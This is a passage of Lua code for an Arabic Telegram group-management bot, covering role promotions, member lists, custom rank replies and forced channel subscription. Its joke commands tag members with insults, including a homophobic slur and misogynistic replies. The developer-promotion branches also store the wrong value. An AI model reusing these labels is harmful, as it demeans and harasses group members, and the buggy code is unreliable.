local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."smb:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠نزلناه من زمان واخد كورسات رجوله 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."smb:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم رفعه سمب في الكروب عقبال ميبقا زي النسوان الي تعبينو 😂  ").Reply,"md",true)  
end
end
if TextMsg == "قرد" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."2rd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠نزلناه من زمان من ع الشجره 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."2rd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم رفعه قرد في الكروب تعال خدلك موزه  😂  ").Reply,"md",true)  
end
end
if TextMsg == "عره" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."3ra:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠محدش محترمه كده كده  😂 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."3ra:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم رفعه عره في الكروب قولو عيب كده 😂  ").Reply,"md",true)  
end
end
if TextMsg == "غبي" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."8by:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠هو كده كده محطوط ف قايمة الاغبية  😂 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."8by:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم رفعه غبي المجموعة  😂  ").Reply,"md",true)  
end
end
end
if text and text:match('^رفع (.*) (%d+)$') then
local UserId = {text:match('^رفع (.*) (%d+)$')}
local UserInfo = LuaTele.getUser(UserId[2])
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if UserId[1] == 'مطور ثانوي' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Devss:Groups",UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Devss:Groups",UserId) 
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم ترقيته مطور ثانوي").Reply,"md",true)  
end
end
if UserId[1] == 'مطور' then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Dev:Groups",UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم ترقيته مطور مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Dev:Groups",UserId) 
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم ترقيته مطور ").Reply,"md",true)  
end
end
if UserId[1] == "مالك" then
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Owners:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته مالك مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Owners:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته مالك ").Reply,"md",true)  
end
end
if UserId[1] == "منشئ اساسي" then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Supcreator:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Supcreator:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته منشئ اساسي ").Reply,"md",true)  
end
end
if UserId[1] == "منشئ" then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Creator:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته منشئ  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Creator:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته منشئ  ").Reply,"md",true)  
end
end
if UserId[1] == "مدير" then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Manger:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته مدير  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Manger:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته مدير  ").Reply,"md",true)  
end
end
if UserId[1] == "ادمن" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(darket.."Status:SetId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(darket.."Admin:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته ادمن  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Admin:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته ادمن  ").Reply,"md",true)  
end
end
if UserId[1] == "مميز" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(darket.."Status:SetId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(darket.."Special:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته مميز  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Special:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم ترقيته مميز  ").Reply,"md",true)  
end
end
end
---تسليه بالايدي
if text and text:match("^تغيير رد المطور (.*)$") then
local Teext = text:match("^تغيير رد المطور (.*)$") 
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:set(darket.."Developer:Bot:Reply"..msg.chat_id,Teext)
return send(msg_chat_id,msg_id,"٠ تم تغيير رد المطور الى :"..Teext)
elseif text and text:match("^تغيير رد المنشئ الاساسي (.*)$") then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
local Teext = text:match("^تغيير رد المنشئ الاساسي (.*)$") 
Redis:set(darket.."President:Group:Reply"..msg.chat_id,Teext)
return send(msg_chat_id,msg_id,"٠ تم تغيير رد المنشئ الاساسي الى :"..Teext)
elseif text and text:match("^تغيير رد المنشئ (.*)$") then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
local Teext = text:match("^تغيير رد المنشئ (.*)$") 
Redis:set(darket.."Constructor:Group:Reply"..msg.chat_id,Teext)
return send(msg_chat_id,msg_id,"٠ تم تغيير رد المنشئ الى :"..Teext)
elseif text and text:match("^تغيير رد المالك (.*)$") then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
local Teext = text:match("^تغيير رد المالك (.*)$") 
Redis:set(darket.."PresidentQ:Group:Reply"..msg.chat_id,Teext)
return send(msg_chat_id,msg_id,"٠ تم تغيير رد المالك الى :"..Teext)
elseif text and text:match("^تغيير رد المدير (.*)$") then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
local Teext = text:match("^تغيير رد المدير (.*)$") 
Redis:set(darket.."Manager:Group:Reply"..msg.chat_id,Teext) 
return send(msg_chat_id,msg_id,"٠ تم تغيير رد المدير الى :"..Teext)
elseif text and text:match("^تغيير رد الادمن (.*)$") then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
local Teext = text:match("^تغيير رد الادمن (.*)$") 
Redis:set(darket.."Admin:Group:Reply"..msg.chat_id,Teext)
return send(msg_chat_id,msg_id,"٠ تم تغيير رد الادمن الى :"..Teext)
elseif text and text:match("^تغيير رد المميز (.*)$") then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
local Teext = text:match("^تغيير رد المميز (.*)$") 
Redis:set(darket.."Vip:Group:Reply"..msg.chat_id,Teext)
return send(msg_chat_id,msg_id,"٠ تم تغيير رد المميز الى :"..Teext)
elseif text and text:match("^تغيير رد العضو (.*)$") then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
local Teext = text:match("^تغيير رد العضو (.*)$") 
Redis:set(darket.."Mempar:Group:Reply"..msg.chat_id,Teext)
return send(msg_chat_id,msg_id,"٠ تم تغيير رد العضو الى :"..Teext)
elseif text == 'حذف رد المطور' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket.."Developer:Bot:Reply"..msg.chat_id)
return send(msg_chat_id,msg_id,"٠ تم حدف رد المطور")
elseif text == 'حذف رد المنشئ الاساسي' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket.."President:Group:Reply"..msg.chat_id)
return send(msg_chat_id,msg_id,"٠ تم حذف رد المنشئ الاساسي ")
elseif text == 'حذف رد المالك' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket.."PresidentQ:Group:Reply"..msg.chat_id)
return send(msg_chat_id,msg_id,"٠ تم حذف رد المالك ")
elseif text == 'حذف رد المنشئ' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket.."Constructor:Group:Reply"..msg.chat_id)
return send(msg_chat_id,msg_id,"٠ تم حذف رد المنشئ ")
elseif text == 'حذف رد المدير' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket.."Manager:Group:Reply"..msg.chat_id) 
return send(msg_chat_id,msg_id,"٠ تم حذف رد المدير ")
elseif text == 'حذف رد الادمن' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket.."Admin:Group:Reply"..msg.chat_id)
return send(msg_chat_id,msg_id,"٠ تم حذف رد الادمن ")
elseif text == 'حذف رد المميز' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket.."Vip:Group:Reply"..msg.chat_id)
return send(msg_chat_id,msg_id,"٠ تم حذف رد المميز")
elseif text == 'حذف رد العضو' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket.."Mempar:Group:Reply"..msg.chat_id)
return send(msg_chat_id,msg_id,"٠ تم حذف رد العضو")
end
if text == 'المطورين الثانويين' or text == 'المطورين الثانوين' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Devss:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مطورين حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه مطورين الثانويين \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المطورين الثانويين', data = msg.sender.user_id..'/Devss'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المطورين' then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Dev:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مطورين حاليا , ","md",true)  
end
local datar = {data = {{text = "مسح المطورين" , data = msg.sender.user_id..'/Dev'}}}
for i = 1,#Info_Members do
infoo = LuaTele.getUser(Info_Members[i])
datar[i] = {{text = infoo.first_name , data =msg.sender.user_id..'/deldev/'..Info_Members[i]}}
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = datar
}
LuaTele.sendText(msg.chat_id,msg.id,'※ ٠ قائمه مطورين البوت',"md",false, false, false, false, reply_markup)
end
if text == 'المالكين' then
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Owners:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مالكين حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المالكين \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المالكين', data = msg.sender.user_id..'/Owners'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المنشئين الاساسيين' then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Supcreator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد منشئين اساسيين حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المنشئين الاساسيين \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المنشئين الاساسيين', data = msg.sender.user_id..'/Supcreator'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المنشئين' then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Creator:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد منشئين حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المنشئين  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المنشئين', data = msg.sender.user_id..'/Creator'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المدراء' then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Manger:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مدراء حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المدراء  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المدراء', data = msg.sender.user_id..'/Manger'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الادمنيه' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Admin:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد ادمنيه حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه الادمنيه  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح الادمنيه', data = msg.sender.user_id..'/Admin'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'المميزين' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."Special:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مميزين حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه المميزين  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح المميزين', data = msg.sender.user_id..'/DelSpecial'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
-----------تسلية-------
if text == 'الخولات' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."kholat:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد خولات حاليا , ","md",true)  
end
ListMembers = '\n*٠ قائمه الخولات  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '- مسح الخولات', data = msg.sender.user_id..'/Delkholat'},},}}
return send(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
end
if text == 'الوتكات' then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."wtka:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد وتكات ناشفة زي المستشفي , ","md",true)  
end
ListMembers = '\n*٠ قائمه الوتكات  \n – – – – – – – –*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
